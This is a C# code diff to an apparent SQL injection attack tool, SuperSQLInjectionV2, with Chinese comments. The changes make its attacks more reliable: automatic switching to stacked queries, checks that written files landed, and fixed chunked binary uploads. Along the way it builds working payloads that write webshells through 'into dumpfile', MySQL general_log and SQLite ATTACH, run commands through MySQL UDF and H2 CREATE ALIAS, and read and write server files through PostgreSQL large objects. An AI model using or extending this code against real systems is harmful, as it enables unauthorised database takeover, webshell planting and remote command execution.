@@ -27,6 +27,32 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         }
 
         /// <summary>
+        /// 堆叠通道自动切换：操作需要堆叠注入而当前注入类型非堆叠时，查注入通道注册表（检测记录）
+        /// 中同目标同参数是否登记过堆叠记录；有则自动切换注入类型为堆叠（带出时间盲注oracle所需的
+        /// BoolInjectType/CheckValue/Revers），并日志告知用户；无则返回false，调用方走原有告警逻辑
+        /// </summary>
+        private static bool TryAutoSwitchStacked(AppConfig config, string opDesc)
+        {
+            var dc = config.DataConfig;
+            if (dc.SelectedInjectType.Equals(InjectType.Stacked))
+            {
+                return true;
+            }
+            InjectRecord? rec = InjectChannelRegistry.FindByType(config.Host, config.Port, dc.InjectParamName, InjectType.Stacked);
+            if (rec == null)
+            {
+                return false;
+            }
+            InjectType oldType = dc.SelectedInjectType;
+            dc.SelectedInjectType = InjectType.Stacked;
+            dc.SelectBoolInject = rec.BoolInjectType;
+            dc.CheckValue = rec.CheckValue ?? "";
+            dc.Reverse = rec.Revers;
+            Log.Success(opDesc + "需要堆叠注入：注入记录中同参数存在堆叠通道，已自动切换注入类型（" + oldType + "→堆叠）！");
+            return true;
+        }
+
+        /// <summary>
         /// 执行文件操作
         /// </summary>
         public static async Task ExecuteFile(AppConfig config, FileCmdViewModel vm)
@@ -203,11 +229,17 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 string stackedPayload = " 1=1;select " + hex + " into dumpfile '" + vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal)
                     + "';select 1 where 1=1 ";
                 await SendPayload(config, stackedPayload).ConfigureAwait(false);
-                Log.Show("堆叠写文件已执行，请人工检查写文件是否成功（需secure_file_priv为空或包含目标目录）！");
+                await VerifyMySqlWrite(config, vm.FilePath, Encoding.UTF8.GetByteCount(vm.FileContent)).ConfigureAwait(false);
                 return;
             }
             if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union))
             {
+                //非Union/堆叠：注入记录中有堆叠通道时自动切换到堆叠后走堆叠写文件
+                if (TryAutoSwitchStacked(config, "写文件"))
+                {
+                    await WriteFileByMySQL(config, vm).ConfigureAwait(false);
+                    return;
+                }
                 Log.Warning("大侠此种方式写文件，只支持Union/堆叠注入！");
                 return;
             }
@@ -230,7 +262,22 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             sb.Remove(sb.Length - 1, 1);
             sb.Append(" into dumpfile '" + vm.FilePath + "'");
             await SendPayload(config, sb.ToString()).ConfigureAwait(false);
-            Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+            await VerifyMySqlWrite(config, vm.FilePath, Encoding.UTF8.GetByteCount(vm.FileContent)).ConfigureAwait(false);
+        }
+
+        /// <summary>MySQL写后读回验证：length(load_file)比对字节数，输出明确的成功/告警日志（文本/二进制写文件共用）</summary>
+        private static async Task VerifyMySqlWrite(AppConfig config, string path, int expectedBytes)
+        {
+            string pathHex = TextCodec.StrToHex(path, "UTF-8");
+            string lenStr = await FetchScalar(config, "(select length(load_file(" + pathHex + ")))").ConfigureAwait(false);
+            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == expectedBytes)
+            {
+                Log.Success("写文件验证通过：远端文件 " + remoteLen + " 字节，与预期一致！");
+            }
+            else
+            {
+                Log.Warning("写文件验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，预期=" + expectedBytes + "）！可能原因：secure_file_priv限制/目录不可写/权限不足，请人工检查。");
+            }
         }
 
         /// <summary>PostgreSQL 文件操作模板取值并替换 {path}/{content} 槽位（模板来自 config/payload/postgresql.txt）</summary>
@@ -328,7 +375,16 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
             }
             await SendPayload(config, PGTPL("FileWriteCopy", vm.FilePath)).ConfigureAwait(false);
-            Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+            //写后读回验证：pg_stat_file取文件体积（与COPY TO同属服务端文件权限族，存在且非空即成功；COPY逐行写出体积与原文有差异不精确比对）
+            string sizeStr = await FetchScalar(config, "(select coalesce((pg_stat_file('" + vm.FilePath.Replace("'", "''", StringComparison.Ordinal) + "',true)).size,0))").ConfigureAwait(false);
+            if (long.TryParse(sizeStr, out long fsize) && fsize > 0)
+            {
+                Log.Success("写文件验证通过：远端文件存在，体积 " + fsize + " 字节！");
+            }
+            else
+            {
+                Log.Warning("写文件验证未通过（远端读取=" + (sizeStr ?? "失败") + "）！可能原因：非superuser/无pg_write_server_files角色/目录不可写，请人工检查。");
+            }
         }
 
         /// <summary>
@@ -520,6 +576,12 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 case InjectType.Time:
                 case InjectType.Stacked:
                 case InjectType.Dns:
+                    //快通道优先：同参数有可用Union/Error记录时一次请求取值（写后验证/UDF探测等免于逐字符盲注）
+                    string? upgraded = await DataComm.TryUpgradeFetch(config, payload, 4096).ConfigureAwait(false);
+                    if (upgraded != null)
+                    {
+                        return upgraded;
+                    }
                     if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                     {
                         Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
@@ -539,7 +601,15 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             bool isStacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
             if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union) && !isStacked)
             {
-                throw new Exception("MySQL UDF命令执行需要Union或堆叠注入（需要将UDF库文件写入plugin目录）！");
+                //注入记录中有堆叠通道时自动切换（UDF写库+create function全堆叠链路更简洁）
+                if (TryAutoSwitchStacked(config, "MySQL UDF命令执行"))
+                {
+                    isStacked = true;
+                }
+                else
+                {
+                    throw new Exception("MySQL UDF命令执行需要Union或堆叠注入（需要将UDF库文件写入plugin目录）！");
+                }
             }
             if (!MySqlUdfSupport.IsAvailable())
             {
@@ -666,7 +736,11 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         {
             if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
             {
-                Log.Show("提示：PG UDF部署语句以堆叠形式发送，要求注入点支持堆叠查询（检测记录中有堆叠命中）；当前仅借" + config.DataConfig.SelectedInjectType + "通道做取值探测。");
+                //有堆叠记录则自动切换（部署全堆叠更可靠）；无则维持"借当前通道探测+堆叠形式尝试发送"策略
+                if (!TryAutoSwitchStacked(config, "PG UDF部署"))
+                {
+                    Log.Show("提示：PG UDF部署语句以堆叠形式发送，要求注入点支持堆叠查询（检测记录中有堆叠命中）；当前仅借" + config.DataConfig.SelectedInjectType + "通道做取值探测。");
+                }
             }
             if (!PgUdfSupport.IsAvailable())
             {
@@ -1149,7 +1223,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// </summary>
         private static async Task WriteFileByMySqlLog(AppConfig config, FileCmdViewModel vm)
         {
-            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "日志写WebShell"))
             {
                 Log.Warning("日志写WebShell需要堆叠注入（set global general_log 系列语句）！");
                 return;
@@ -1246,7 +1320,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// <summary>SQLite ATTACH写WebShell：附加目标文件为新库，建表插入blob内容（x'hex'），需堆叠注入</summary>
         private static async Task WriteFileBySqlite(AppConfig config, FileCmdViewModel vm)
         {
-            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "ATTACH写WebShell"))
             {
                 Log.Warning("ATTACH写WebShell需要堆叠注入（attach database/create table/insert 三条语句）！");
                 return;
@@ -1597,7 +1671,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// <summary>H2 CREATE ALIAS命令执行：堆叠建Java函数别名SQX（$$美元引用规避引号），取值走当前通道</summary>
         private static async Task ExecuteCmdH2(AppConfig config, FileCmdViewModel vm)
         {
-            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "H2命令执行"))
             {
                 //H2 JDBC单execute可执行多语句（CommandList），堆叠能力与注入点类型无关（同PG UDF策略：尝试发送而非直接拒绝）
                 Log.Warning("提示：当前注入点非堆叠类型，CREATE ALIAS仍以堆叠形式尝试发送（H2驱动支持单请求多语句时可用）！");
@@ -1745,6 +1819,12 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     }
                     return sb.ToString().Trim();
                 default:
+                    //快通道优先：同参数有可用Union/Error记录时一次请求取hex（二进制下载免于逐字符盲注）
+                    string? upgradedHex = await DataComm.TryUpgradeFetch(config, hexExpr, maxHexLen).ConfigureAwait(false);
+                    if (upgradedHex != null)
+                    {
+                        return upgradedHex.Trim();
+                    }
                     if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                     {
                         Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
@@ -1843,14 +1923,26 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 return;
             }
             string pathEsc = vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
-            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Union))
+            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union)
+                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked)
+                && !TryAutoSwitchStacked(config, "二进制上传"))
             {
-                //Union单发（大小受请求长度限制，>4KB建议堆叠分片）
-                if (data.Length > 4000)
+                Log.Warning("二进制上传只支持Union/堆叠注入（盲注/时间通道无法执行into dumpfile写操作）！");
+                return;
+            }
+            bool useUnion = config.DataConfig.SelectedInjectType.Equals(InjectType.Union);
+            if (useUnion && data.Length > 4000)
+            {
+                //Union单发超限：注入记录中有堆叠通道时自动降级堆叠分片上传，无记录才拒绝
+                if (!TryAutoSwitchStacked(config, "二进制上传（超4KB）"))
                 {
-                    Log.Warning("Union单发上传超过4KB（" + data.Length + "字节），URL/请求体可能超限，请改用堆叠注入通道分片上传！");
+                    Log.Warning("Union单发上传超过4KB（" + data.Length + "字节），URL/请求体可能超限，且注入记录中无堆叠通道可降级，请改用堆叠注入点！");
                     return;
                 }
+                useUnion = false;
+            }
+            if (useUnion)
+            {
                 int columnsLen = config.DataConfig.SumColumnCount;
                 int showIndex = config.DataConfig.ShowColumnIndex;
                 StringBuilder sb = new StringBuilder(" 1=2 union select ");
@@ -1881,7 +1973,9 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                         await SendPayload(config, " 1=1;insert into ssqlibin(d) values(0x" + Convert.ToHexString(data, off, len) + ");select 1 where 1=1 ").ConfigureAwait(false);
                         Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
                     }
-                    await SendPayload(config, " 1=1;select d from ssqlibin order by id into dumpfile '" + pathEsc + "';select 1 where 1=1 ").ConfigureAwait(false);
+                    //INTO DUMPFILE多行不可靠（实测5行仅落盘2行），先group_concat聚合成单行再落盘；
+                    //group_concat_max_len默认1024必须调大，blob参数使结果保持二进制串
+                    await SendPayload(config, " 1=1;set session group_concat_max_len=1073741824;select group_concat(d order by id separator '') from ssqlibin into dumpfile '" + pathEsc + "';select 1 where 1=1 ").ConfigureAwait(false);
                 }
                 finally
                 {
@@ -1895,25 +1989,28 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
             }
             //写后验证：length(load_file) 比对字节数
-            string pathHex = TextCodec.StrToHex(vm.FilePath, "UTF-8");
-            string lenStr = await FetchScalar(config, "(select length(load_file(" + pathHex + ")))").ConfigureAwait(false);
-            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
-            {
-                Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
-            }
-            else
-            {
-                Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "）！可能原因：secure_file_priv限制/目录不可写/权限不足，请人工检查。");
-            }
+            await VerifyMySqlWrite(config, vm.FilePath, data.Length).ConfigureAwait(false);
         }
 
         //---------- PostgreSQL：大对象 encode/decode hex 双向（Union/报错/堆叠） ----------
+
+        /// <summary>PG二进制大对象通道保障：盲注/时间通道时优先自动切换堆叠记录（二进制分页读写走SendStackedStmt不依赖回显），再回落Union/报错校验</summary>
+        private static bool EnsurePgBinaryChannel(AppConfig config, ref bool stacked)
+        {
+            if (!stacked
+                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Union)
+                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Error))
+            {
+                stacked = TryAutoSwitchStacked(config, "大对象二进制读写");
+            }
+            return stacked || EnsurePgLoChannel(config);
+        }
 
         /// <summary>PG 二进制下载：lo_import导入→pg_largeobject取encode hex→lo_unlink清理（需superuser或pg_read_server_files；堆叠/Union/报错通道）</summary>
         private static async Task BinaryDownloadPg(AppConfig config, FileCmdViewModel vm)
         {
             bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
-            if (!stacked && !EnsurePgLoChannel(config))
+            if (!EnsurePgBinaryChannel(config, ref stacked))
             {
                 return;
             }
@@ -1961,7 +2058,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 return;
             }
             bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
-            if (!stacked && !EnsurePgLoChannel(config))
+            if (!EnsurePgBinaryChannel(config, ref stacked))
             {
                 return;
             }
@@ -1969,12 +2066,19 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
             if (!stacked)
             {
-                //Union/报错单发：lo_from_bytea一次性写入（大小受请求长度限制）
+                //Union/报错单发：lo_from_bytea一次性写入（大小受请求长度限制）；超限且有堆叠记录时自动降级堆叠分页
                 if (data.Length > 4000)
                 {
-                    Log.Warning("Union/报错单发上传超过4KB（" + data.Length + "字节），请求体可能超限，请改用堆叠注入通道分片上传！");
-                    return;
+                    if (!TryAutoSwitchStacked(config, "PG二进制上传（超4KB）"))
+                    {
+                        Log.Warning("Union/报错单发上传超过4KB（" + data.Length + "字节），请求体可能超限，且注入记录中无堆叠通道可降级，请改用堆叠注入点！");
+                        return;
+                    }
+                    stacked = true;
                 }
+            }
+            if (!stacked)
+            {
                 Log.Show("大对象二进制上传（" + data.Length + "字节，loid=" + oid + "）……");
                 await FetchScalar(config, "(select lo_from_bytea(" + oid + ",decode('" + Convert.ToHexString(data) + "','hex')))").ConfigureAwait(false);
             }
